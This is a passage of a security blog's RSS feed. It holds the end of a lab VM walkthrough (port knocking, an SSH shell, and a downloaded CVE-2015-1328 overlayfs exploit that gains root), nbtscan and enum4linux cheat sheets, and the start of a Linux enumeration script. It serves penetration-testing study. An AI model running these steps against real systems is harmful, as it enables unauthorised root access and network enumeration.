&lt;p&gt;&lt;img src=&quot;/img/blog/fartknocker/pcap-follow-tcp-stream-wireshark.png&quot; alt=&quot;Wireshark pcap follow tcp stream&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The hint: &lt;code&gt;eins drei drei sieben&lt;/code&gt; is German for &lt;code&gt;1 3 3 7&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The previous port knocking patterned worked again for ports &lt;code&gt;1 3 3 7&lt;/code&gt;:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root:~]# ./knock.sh 10.0.1.113 1 3 3 7&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; telnet 10.0.1.113 1337

Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.28 seconds
Trying 10.0.1.113...
Connected to 10.0.1.113.
Escape character is &lt;span class=&quot;s1&quot;&gt;'^]'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
/iamcornholio/
Connection closed by foreign host.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;code&gt;http://10.0.1.113/iamcornholio/&lt;/code&gt;, disclosed a Base64 encoded string:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/fartknocker/base64.png&quot; alt=&quot;Base64 String&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The string was decoded, revealing another port knocking sequence:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root:~]# &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;T3BlbiB1cCBTU0g6IDg4ODggOTk5OSA3Nzc3IDY2NjYK&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
Open up SSH: 8888 9999 7777 6666&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The previous port knocking technique was leveraged:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root:~]# ./knock.sh 10.0.1.113 8888 9999 7777 6666&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ssh 10.0.1.113

The authenticity of host &lt;span class=&quot;s1&quot;&gt;'10.0.1.113 (10.0.1.113)'&lt;/span&gt; can&lt;span class=&quot;s1&quot;&gt;'t be established.
ECDSA key fingerprint is fe:16:33:a4:4d:7f:3d:db:b6:11:d4:b8:c1:32:b6:79.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '&lt;/span&gt;10.0.1.113&lt;span class=&quot;s1&quot;&gt;' (ECDSA) to the list of known hosts.
############################################
# CONGRATS! YOU HAVE OPENED THE SSH SERVER #
# USERNAME: butthead                       #
# PASSWORD: nachosrule                     #
############################################
root@10.0.1.113'&lt;/span&gt;s password:&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Logging in using the disclosed credentials worked, but the session closed almost immediately and displayed the following message:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;butthead@10.0.1.113&lt;span class=&quot;s1&quot;&gt;'s password:
Welcome to Ubuntu 14.04.2 LTS (GNU/Linux 3.13.0-46-generic i686)

 * Documentation:  https://help.ubuntu.com/
Last login: Tue Mar  3 01:02:49 2015 from 192.168.56.102
You are only logging in for a split second! What do you do!
Connection to 10.0.1.113 closed.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The following command was executed, successfully spawning a shell on the target:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root:~]# ./knock.sh 10.0.1.113 8888 9999 7777 6666&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ssh butthead@10.0.1.113 &lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;local-system-enumeration&quot;&gt;Local System Enumeration&lt;/h2&gt;

&lt;p&gt;The following hint was discovered:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;nachos
Great job on getting this far.

Can you login as beavis or root ?&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;local-privilege-escalation&quot;&gt;Local Privilege Escalation&lt;/h2&gt;

&lt;p&gt;Enumeration of the system indicted it was likely vulnerable to &lt;a href=&quot;https://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html&quot;&gt;CVE-2015-1328&lt;/a&gt;, a local privilege escalation using overlayfs mounts inside of user namespaces. Allowing a local user to exploit the flaw to
gain administrative privileges on the system.&lt;/p&gt;

&lt;p&gt;Exploit process (CVE-2015-1328):&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget https://www.exploit-db.com/download/37292
&lt;span class=&quot;nt&quot;&gt;--2015-12-19&lt;/span&gt; 05:18:22--  https://www.exploit-db.com/download/37292
Resolving www.exploit-db.com &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www.exploit-db.com&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;... 192.124.249.8
Connecting to www.exploit-db.com &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www.exploit-db.com&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;|192.124.249.8|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5123 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5.0K&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;application/txt]
Saving to: ‘37292’

     0K .....                                                 100% 1.29G&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0s

2015-12-19 05:18:25 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.29 GB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - ‘37292’ saved &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;5123/5123]

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;37292
nachos
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;37292 37292.c
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc 37292.c &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; 37292
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./37292
spawning threads
mount &lt;span class=&quot;c&quot;&gt;#1&lt;/span&gt;
mount &lt;span class=&quot;c&quot;&gt;#2&lt;/span&gt;
child threads &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
/etc/ld.so.preload created
creating shared library
sh: 0: can&lt;span class=&quot;s1&quot;&gt;'t access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root),1001(butthead)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;root-flag&quot;&gt;Root Flag&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# cd /root&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# ls&lt;/span&gt;
SECRETZ
&lt;span class=&quot;c&quot;&gt;# cat SECRETZ&lt;/span&gt;
You have &lt;span class=&quot;k&quot;&gt;done &lt;/span&gt;a great job, &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;you can see this, please shoot me an email
and &lt;span class=&quot;nb&quot;&gt;let &lt;/span&gt;me know that you have beat this box!

SECRET &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;LIVE LONG AND PROSPER, REST IN PEACE MR. SPOCK&quot;&lt;/span&gt;

admin@top-hat-sec.com&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;I enjoyed the VM, dispite not being a fan of &lt;em&gt;Beavis and Butt-Head&lt;/em&gt;. Looking at the pcap files for port knocking patterns was a new experience for me.&lt;/p&gt;

&lt;p&gt;Thanks for the VM :)&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>nbtscan Cheat Sheet</title>
          <link>https://highon.coffee/blog/nbtscan-cheat-sheet/</link>
          <pubDate>Sun, 29 Mar 2015 14:37:10 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>Windows</category>
          
          <category>SMB</category>
          
          <category>smb-enum</category>
          
          <category>Tools</category>
          
          
          <category>cheat-sheet</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/nbtscan-cheat-sheet/</guid>
          <description>&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;http://www.unixwiz.net/tools/nbtscan.html&quot;&gt;nbtscan&lt;/a&gt;&lt;/strong&gt; is a command line tool that finds exposed NETBIOS nameservers, it’s a good first step for finding open shares.&lt;/p&gt;

&lt;div class=&quot;note tip&quot;&gt;
  &lt;h5&gt;Don't use the version of nbtscan that ships with KALI&lt;/h5&gt;
  &lt;p&gt;Grab nbtscan from the above link and build it from source, this version tends to find more information&lt;/p&gt;
&lt;/div&gt;

&lt;h3 id=&quot;compile-nbtscan-on-kali&quot;&gt;Compile nbtscan on KALI&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/nbtscan# wget http://www.unixwiz.net/tools/nbtscan-source-1.0.35.tgz
root@kali:~/nbtscan# &lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-xvzf&lt;/span&gt; nbtscan-source-1.0.35.tgz
root@kali:~/nbtscan# make
root@kali:~/nbtscan# ./nbtscan
nbtscan 1.0.35 - 2008-04-08 - http://www.unixwiz.net/tools/

usage: ./nbtscan &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;options] target &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;targets...]

   Targets are lists of IP addresses, DNS names, or address
   ranges. Ranges can be &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /nbits notation &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;192.168.12.0/24&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   or with a range &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the last octet &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;192.168.12.64-97&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;nbtscan-cheat-sheet&quot;&gt;nbtscan Cheat Sheet&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;nbtscan -v&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Displays the nbtscan version&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

     &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;nbtscan -f target(s)&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;This shows the full NBT resource record responses for each machine scanned, not a one line summary, use this options when scanning a single host&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;nbtscan -O file-name.txt target(s)&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Sends output to a file&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;nbtscan -H&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Generate an HTTP header&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;nbtscan -P&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Generate Perl hashref output, which can be loaded into an existing program for easier processing, much easier than parsing text output&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;nbtscan -V&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
           &lt;p&gt;Enable verbose mode&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;nbtscan -n&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
           &lt;p&gt;Turns off this inverse name lookup, for hanging resolution&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;nbtscan -p PORT target(s)&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
           &lt;p&gt;This allows specification of a UDP port number to be used as the source in sending a query&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;nbtscan -m&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
           &lt;p&gt;Include the MAC (aka &quot;Ethernet&quot;) addresses in the response, which is already implied by the -f option.&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>enum4linux Cheat Sheet</title>
          <link>https://highon.coffee/blog/enum4linux-cheat-sheet/</link>
          <pubDate>Sun, 29 Mar 2015 00:58:10 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>Windows</category>
          
          <category>smb-enum</category>
          
          <category>SMB</category>
          
          <category>Tools</category>
          
          
          <category>Cheat-Sheet</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/enum4linux-cheat-sheet/</guid>
          <description>&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://labs.portcullis.co.uk/tools/enum4linux/&quot;&gt;enum4linux&lt;/a&gt;&lt;/strong&gt; is an alternative to enum.exe on Windows, enum4linux is used to enumerate Windows and Samba hosts.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;enum4linux in a nutshell&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;RID cycling (When RestrictAnonymous is set to 1 on Windows 2000)&lt;/li&gt;
  &lt;li&gt;User listing (When RestrictAnonymous is set to 0 on Windows 2000)&lt;/li&gt;
  &lt;li&gt;Listing of group membership information&lt;/li&gt;
  &lt;li&gt;Share enumeration&lt;/li&gt;
  &lt;li&gt;Detecting if host is in a workgroup or a domain&lt;/li&gt;
  &lt;li&gt;Identifying the remote operating system&lt;/li&gt;
  &lt;li&gt;Password policy retrieval (using polenum)&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;enum4linux-cheat-sheet&quot;&gt;enum4linux Cheat Sheet&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;enum4linux -v target-ip&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Verbose mode, shows the underlying commands being executed by enum4linux&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

     &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;enum4linux -a target-ip&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Do Everything, runs all options apart from dictionary based share name guessing&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;enum4linux -U target-ip&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Lists usernames, if the server allows it - (RestrictAnonymous = 0)&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;enum4linux -u administrator &lt;br /&gt;-p password -U target-ip&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;If you've managed to obtain credentials, you can pull a full list of users regardless of the RestrictAnonymous option&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;enum4linux -r target-ip&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Pulls usernames from the default RID range (500-550,1000-1050)&lt;/p&gt; 
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;enum4linux -R 600-660 target-ip&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
           &lt;p&gt;Pull usernames using a custom RID range&lt;/p&gt; 
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;enum4linux -G target-ip&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
           &lt;p&gt;Lists groups. if the server allows it, you can also specify username &lt;code&gt;-u&lt;/code&gt; and password &lt;code&gt;-p&lt;/code&gt;&lt;/p&gt; 
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;enum4linux -S target-ip&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
           &lt;p&gt;List Windows shares, again you can also specify username &lt;code&gt;-u&lt;/code&gt; and password &lt;code&gt;-p&lt;/code&gt;&lt;/p&gt; 
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;enum4linux -s shares.txt target-ip&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
           &lt;p&gt;Perform a dictionary attack, if the server doesn't let you retrieve a share list &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;enum4linux -o target-ip&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
           &lt;p&gt;Pulls OS information using smbclient, this can pull the service pack version on some versions of Windows&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;td&gt;
        &lt;p&gt;&lt;code&gt;enum4linux -i target-ip&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
           &lt;p&gt;Pull information about printers known to the remove device.&lt;/p&gt;
      &lt;/td&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>Linux Local Enumeration Script</title>
          <link>https://highon.coffee/blog/linux-local-enumeration-script/</link>
          <pubDate>Sat, 28 Mar 2015 12:32:10 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>linux-enum</category>
          
          
          <category>Tools</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/linux-local-enumeration-script/</guid>
          <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#linux-local-enumeration-script-demo&quot; id=&quot;markdown-toc-linux-local-enumeration-script-demo&quot;&gt;Linux Local Enumeration Script Demo&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#script-code&quot; id=&quot;markdown-toc-script-code&quot;&gt;Script Code&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#wget-url&quot; id=&quot;markdown-toc-wget-url&quot;&gt;Wget URL&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I’ve made my &lt;strong&gt;Linux Local Enumeration Script&lt;/strong&gt; available below, it’s far from perfect and I could spend forever improving it.&lt;/p&gt;

&lt;p&gt;But, it has saved me a bunch of time and it works great for a first pass, after that post shell excitment :)&lt;/p&gt;

&lt;p&gt;You might also be interested in this list of &lt;a href=&quot;https://highon.coffee/docs/linux-commands&quot;&gt;Linux commands&lt;/a&gt; for post exploit / local privilege enumeration.&lt;/p&gt;

&lt;h2 id=&quot;linux-local-enumeration-script-demo&quot;&gt;Linux Local Enumeration Script Demo&lt;/h2&gt;

&lt;p&gt;Here it is in action, I think it gives a nice clean output:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/linux-local-enumeration-script/linux-local-enumeration-script.gif&quot; alt=&quot;Linux Local Enumeration Script Demo&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;script-code&quot;&gt;Script Code&lt;/h2&gt;

&lt;p&gt;For copying and pasting:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;BLACK&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[30m&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;RED&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[31m&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;GREEN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[32m&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;YELLOW&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[33m&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;BLUE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[34m&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;PINK&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[35m&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;CYAN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[36m&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;WHITE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[37m&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;NORMAL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[0;39m&quot;&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# Quick Linux Local Enumeration Script &lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# v1.0&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;
                       .
                        `:.
                          `:.
                  .:'     ,::
                 .:'      ;:'
                 ::      ;:'
                  :    .:'
                   `.  :.
          _________________________
         :                         :
     ,---:      HighOn.Coffee      :
    : ,'&quot;`:                       :'
    `.`.  `:                     :'
      `.`-._:                   :
        `-.__`.               ,' 
    ,--------`&quot;`-------------'--------.
     `&quot;--.__                   __.--&quot;'
            `&quot;&quot;-------------&quot;&quot;'
&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;
EOF

&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;1.4

&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;URL: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$GREEN&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; http://highon.coffee &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NORMAL&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;0.4

&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Version: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$YELLOW&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; 1.0 &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NORMAL&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;0.4

&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Twitter: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; @HighOn_Coffee &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NORMAL&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;0.2
